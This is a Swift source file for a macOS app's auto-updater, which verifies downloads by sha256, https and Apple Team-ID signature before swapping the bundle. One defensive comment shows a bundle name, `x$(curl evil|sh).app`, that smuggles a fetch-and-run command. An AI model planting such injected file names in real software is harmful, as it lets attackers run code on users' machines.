// Black Label Sovereign — in-app auto-updater (Developer-ID direct-download build).
//
// Goal: a user on build N sees "Update available → Install", clicks once, and is running build N+1
// seconds later — no website visit, no manual re-download. So when we fix a bug we ship it once and
// every installed user gets it. This is the SWIFT APP updater only — it swaps the .app bundle and
// relaunches it; it does NOT touch the Sovereign daemon, voice loop, brain/memory, or any user data.
//
// HOW IT WORKS
//   1. A tiny PUBLIC manifest (https://blacklabelbots.com/api/version/sovereign) says what the
//      latest build is, where to download it, and its sha256.
//   2. The app compares manifest.latest_build to its own CFBundleVersion (on launch, daily, and via
//      the "Check for Updates…" menu item).
//   3. If newer, it prompts. On Install it downloads the zip, VERIFIES it
//      (mandatory sha256 match + a code signature that chains to Apple AND carries OUR Apple Team ID
//      745ZPGFRA5 — Security.framework, no shell-out), unzips, then a detached helper swaps the bundle
//      and relaunches.
//
// SECURITY: the download is public on purpose (a fix must reach every user, logged in or not — the
// Sparkle-appcast model). It is safe because nothing is installed until the new bundle's bytes match
// the manifest sha256 AND its code signature chains to Apple and carries Team ID 745ZPGFRA5. This
// in-process check verifies the SIGNATURE (Team ID + Apple anchor), not the notarization ticket
// itself — notarization is what Gatekeeper enforces when the swapped app is launched. A hijacked
// CDN/manifest cannot get anything past both the sha256 and the Team-ID signature check.
//
// SANDBOX: self-replace requires the NON-sandboxed Developer-ID build (hardened runtime + notarized,
// produced by `./build.command --devid` or `./build-developer-id.sh`). The pure logic here (version
// compare, manifest decode, sha256) is always available + unit-tested; the install/relaunch path
// (UpdaterUI.swift) only runs on the Dev-ID build. macOS-only: the iOS target omits the updater.
import Foundation
#if canImport(FoundationNetworking)
import FoundationNetworking
#endif
import CircuitPortKit
#if os(macOS)
import Foundation
import CryptoKit
import Security

// MARK: - Manifest

/// The published "latest version" descriptor. Snake_case wire keys; tolerant of extra/missing fields.
struct UpdateManifest: Codable, Equatable {
    var product: String
    var latestBuild: Int
    var latestVersion: String?
    /// Direct download URL for the notarized zip. OPTIONAL: the public manifest
    /// intentionally omits it when the build is account-gated (the `download`
    /// field then carries a human message like "sign in to your account").
    /// `checkForUpdate` still works without it; `stage` surfaces an honest error.
    var downloadURL: String?
    var sha256: String?
    var notarized: Bool?
    var teamID: String?
    var releaseNotes: String?
    var mandatory: Bool?
    /// Builds below this floor must update (the manifest has published this field since b38;
    /// decoding + enforcing it closes the rollback window instead of silently ignoring it).
    var minSupportedBuild: Int?

    enum CodingKeys: String, CodingKey {
        case product
        case latestBuild = "latest_build"
        case latestVersion = "latest_version"
        case downloadURL = "download_url"
        case sha256, notarized
        case teamID = "team_id"
        case releaseNotes = "release_notes"
        case mandatory
        case minSupportedBuild = "min_supported_build"
    }

    /// True when this update is not optional for the given installed build: either the publisher
    /// flagged it `mandatory`, or the installed build is below `min_supported_build`.
    func isRequired(forCurrentBuild build: Int) -> Bool {
        if mandatory == true { return true }
        if let floor = minSupportedBuild, build < floor { return true }
        return false
    }
}

enum UpdaterError: LocalizedError {
    case badURL
    case insecureURL
    case missingChecksum
    case transport(String)
    case http(Int)
    case decode(String)
    case noDirectDownload
    case checksum(expected: String, got: String)
    case noAppInZip
    case signature(String)
    case unzip(String)
    case install(String)

    var errorDescription: String? {
        switch self {
        case .badURL: return "The update location wasn't a valid URL."
        case .insecureURL: return "The update download wasn't offered over https — nothing was installed."
        case .missingChecksum: return "The update manifest didn't publish a checksum, so the download's integrity can't be proven — nothing was installed."
        case .transport(let m): return "Couldn't reach the update server (\(m))."
        case .http(let c): return "Update server returned HTTP \(c)."
        case .decode(let m): return "The update manifest wasn't understood (\(m))."
        case .noDirectDownload: return "An update is available. Open your Black Label account (or use your access code) to download it — this build is delivered through your account."
        case .checksum: return "The downloaded update failed its integrity check — nothing was installed."
        case .noAppInZip: return "The downloaded update didn't contain an app — nothing was installed."
        case .signature(let m): return "The update isn't a genuine Black Label build signed by our Apple Team ID (\(m)) — nothing was installed."
        case .unzip(let m): return "Couldn't unpack the update (\(m))."
        case .install(let m): return "Couldn't install the update (\(m))."
        }
    }
}

// MARK: - Updater (pure core + side-effecting install)

enum Updater {
    /// Our Apple Developer Team ID. The update bundle MUST be signed by this team or it's rejected.
    static let teamID = "745ZPGFRA5"
    /// UserDefaults override for the manifest URL (QA / local testing). Empty → the live default.
    static let manifestOverrideKey = "blsov.updateManifestURL"
    static let lastCheckKey = "blsov.updateLastCheckEpoch"

    static var manifestURL: URL {
        let raw = (UserDefaults.standard.string(forKey: manifestOverrideKey) ?? "")
            .trimmingCharacters(in: .whitespacesAndNewlines)
        if !raw.isEmpty, let u = URL(string: raw), u.scheme != nil { return u }
        return URL(string: "https://blacklabelbots.com/api/version/sovereign")!
    }

    // MARK: Pure, unit-tested

    /// Strictly newer build number. Equal or older → no update. The single source of "is there an update".
    static func isNewer(latestBuild: Int, currentBuild: Int) -> Bool { latestBuild > currentBuild }

    /// Lowercase hex sha256 — used to verify the downloaded bytes match the manifest.
    static func sha256Hex(_ data: Data) -> String {
        SHA256.hash(data: data).map { String(format: "%02x", $0) }.joined()
    }

    /// Decode the manifest JSON, surfacing a clean error on malformed input (never crashes).
    static func decodeManifest(_ data: Data) throws -> UpdateManifest {
        do { return try JSONDecoder().decode(UpdateManifest.self, from: data) }
        catch { throw UpdaterError.decode(error.localizedDescription) }
    }

    /// This binary's build number (CFBundleVersion). 0 if absent (treats unknown as "older").
    static func currentBuild() -> Int {
        Int(Bundle.main.object(forInfoDictionaryKey: "CFBundleVersion") as? String ?? "") ?? 0
    }

    static func currentVersionString() -> String {
        let v = Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "1.0"
        return "\(v) (build \(currentBuild()))"
    }

    // MARK: Network

    private static let session: URLSession = {
        let c = URLSessionConfiguration.default
        c.timeoutIntervalForRequest = 20
        c.requestCachePolicy = .reloadIgnoringLocalCacheData
        c.waitsForConnectivity = false
        return URLSession(configuration: c)
    }()

    static func fetchManifest(from url: URL = manifestURL) async throws -> UpdateManifest {
        var req = URLRequest(url: url)
        req.setValue("BlackLabelSovereign/\(currentBuild()) (macOS)", forHTTPHeaderField: "User-Agent")
        req.setValue("application/json", forHTTPHeaderField: "Accept")
        let data: Data, resp: URLResponse
        do { (data, resp) = try await session.data(for: req) }
        catch { throw UpdaterError.transport(error.localizedDescription) }
        if let http = resp as? HTTPURLResponse, !(200...299).contains(http.statusCode) {
            throw UpdaterError.http(http.statusCode)
        }
        return try decodeManifest(data)
    }

    /// Returns the manifest IFF it describes a strictly-newer build, else nil. Records the check time.
    static func checkForUpdate() async throws -> UpdateManifest? {
        let m = try await fetchManifest()
        UserDefaults.standard.set(Date().timeIntervalSince1970, forKey: lastCheckKey)
        return isNewer(latestBuild: m.latestBuild, currentBuild: currentBuild()) ? m : nil
    }

    /// True if it's been >= 24h since the last successful check (drives the daily auto-check).
    static func dueForBackgroundCheck(now: TimeInterval = Date().timeIntervalSince1970) -> Bool {
        let last = UserDefaults.standard.double(forKey: lastCheckKey)
        return last == 0 || (now - last) >= 24 * 3600
    }

    // MARK: Verify (security-critical)

    /// Throws unless `appURL` carries a code signature that chains to Apple (anchor apple generic) AND
    /// has our Team ID in the leaf cert. In-process via Security.framework — no codesign/spctl
    /// subprocess, so it works regardless of entitlements. This proves the SIGNATURE (Team ID + Apple
    /// anchor); the notarization ticket itself is enforced by Gatekeeper when the swapped app launches.
    static func verifySignature(appURL: URL, requiredTeamID: String = teamID) throws {
        var staticCode: SecStaticCode?
        guard SecStaticCodeCreateWithPath(appURL as CFURL, SecCSFlags(rawValue: 0), &staticCode) == errSecSuccess,
              let code = staticCode else {
            throw UpdaterError.signature("unreadable signature")
        }
        // anchor apple generic = chains to Apple; OU = our Developer Team ID. Together: a genuine
        // Developer-ID build signed by us. (Notarization is additionally enforced by Gatekeeper at
        // launch of the swapped bundle; this requirement blocks any non-ours binary up front.)
        let reqStr = "anchor apple generic and certificate leaf[subject.OU] = \"\(requiredTeamID)\"" as CFString
        var requirement: SecRequirement?
        guard SecRequirementCreateWithString(reqStr, SecCSFlags(rawValue: 0), &requirement) == errSecSuccess,
              let req = requirement else {
            throw UpdaterError.signature("requirement build failed")
        }
        let status = SecStaticCodeCheckValidity(code, SecCSFlags(rawValue: 0), req)
        guard status == errSecSuccess else {
            throw UpdaterError.signature("validity \(status)")
        }
    }

    // MARK: Download + stage (returns the verified, unzipped .app ready to swap in)

    /// Downloads the update zip, verifies sha256 + signature, unzips, and returns the staged .app URL.
    /// Throws (installing nothing) on any integrity/signature failure.
    static func stage(_ m: UpdateManifest) async throws -> URL {
        // The public manifest omits download_url for account-gated builds; surface
        // an honest "download from your account" message rather than a decode crash.
        guard let raw = m.downloadURL?.trimmingCharacters(in: .whitespacesAndNewlines), !raw.isEmpty else {
            throw UpdaterError.noDirectDownload
        }
        guard let url = URL(string: raw) else { throw UpdaterError.badURL }
        // Pin the download to https: a plaintext http download is trivially MITM'd, and the manifest
        // itself could be hijacked into pointing at one. (The sha256 + signature checks below are the
        // real gate, but there is no reason to ever pull the bytes over an unencrypted channel.)
        guard url.scheme?.lowercased() == "https" else { throw UpdaterError.insecureURL }
        // MANDATORY integrity: the live manifest publishes a sha256 (and notarized:true) for every
        // build, so a missing/empty checksum is not a normal state — it means we cannot prove the
        // bytes we got are the bytes we published. Refuse rather than silently skip the check.
        guard let expected = m.sha256?.lowercased(), !expected.isEmpty else {
            throw UpdaterError.missingChecksum
        }
        let data: Data, resp: URLResponse
        do { (data, resp) = try await session.data(from: url) }
        catch { throw UpdaterError.transport(error.localizedDescription) }
        if let http = resp as? HTTPURLResponse, !(200...299).contains(http.statusCode) {
            throw UpdaterError.http(http.statusCode)
        }
        try verifyPayload(data, expectedSha256: expected)
        // Write + unzip into a private temp dir.
        let work = URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
            .appendingPathComponent("blsov-update-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: work, withIntermediateDirectories: true)
        let zipURL = work.appendingPathComponent("update.zip")
        try data.write(to: zipURL)
        let unzipDir = work.appendingPathComponent("unzipped", isDirectory: true)
        try FileManager.default.createDirectory(at: unzipDir, withIntermediateDirectories: true)
        try runDitto(extract: zipURL, to: unzipDir)
        // Find the .app.
        let contents = (try? FileManager.default.contentsOfDirectory(at: unzipDir, includingPropertiesForKeys: nil)) ?? []
        guard let appURL = contents.first(where: { $0.pathExtension == "app" }) else { throw UpdaterError.noAppInZip }
        // SECURITY (self-replace injection): the discovered bundle's NAME comes from the downloaded zip
        // — attacker-influenced. Renaming a signed bundle does NOT invalidate its signature, so a name
        // like `x$(curl evil|sh).app` would pass verifySignature and then be interpolated verbatim into
        // the `/bin/sh` swap script (UpdaterUI.performSwapAndRelaunch), executing arbitrary code.
        // Neutralize it BEFORE any further use: move the bundle to a FIXED, code-controlled name, verify
        // THAT, and return it. From here on the staged path is a constant this code chose, never a
        // string derived from the download.
        let stagedApp = stagedBundleURL(in: unzipDir)
        if appURL.standardizedFileURL != stagedApp.standardizedFileURL {
            try? FileManager.default.removeItem(at: stagedApp)
            do { try FileManager.default.moveItem(at: appURL, to: stagedApp) }
            catch { throw UpdaterError.install("couldn't stage the update bundle: \(error.localizedDescription)") }
        }
        try verifySignature(appURL: stagedApp)
        return stagedApp
    }

    /// A10 seam (§10 adversarial catalog): the mandatory integrity comparison between downloaded
    /// bytes and the manifest's published sha256. PURE and unit-tested — throws `.checksum` on any
    /// mismatch. stage() calls this BEFORE the payload is written to disk or handed to ditto, so a
    /// tampered download installs nothing and unpacks nothing (the ordering is itself asserted by
    /// the logic tests against this file's source).
    static func verifyPayload(_ data: Data, expectedSha256 expected: String) throws {
        let want = expected.lowercased()
        let got = sha256Hex(data)
        guard got == want else { throw UpdaterError.checksum(expected: want, got: got) }
    }

    /// The FIXED, code-controlled bundle name a staged update is renamed to before it is verified or
    /// swapped in. Pure + non-attacker-derived on purpose: the swap script only ever sees this constant
    /// path, so no bundle name from a downloaded zip can reach a shell. PURE → unit-testable.
    static func stagedBundleURL(in dir: URL) -> URL {
        dir.appendingPathComponent("Sovereign.app", isDirectory: true)
    }

    private static func runDitto(extract zip: URL, to dest: URL) throws {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/ditto")
        p.arguments = ["-x", "-k", zip.path, dest.path]
        let err = Pipe(); p.standardError = err
        do { try p.run() } catch { throw UpdaterError.unzip(error.localizedDescription) }
        p.waitUntilExit()
        guard p.terminationStatus == 0 else {
            let msg = String(data: err.fileHandleForReading.readDataToEndOfFile(), encoding: .utf8) ?? "ditto \(p.terminationStatus)"
            throw UpdaterError.unzip(msg)
        }
    }
}
#endif
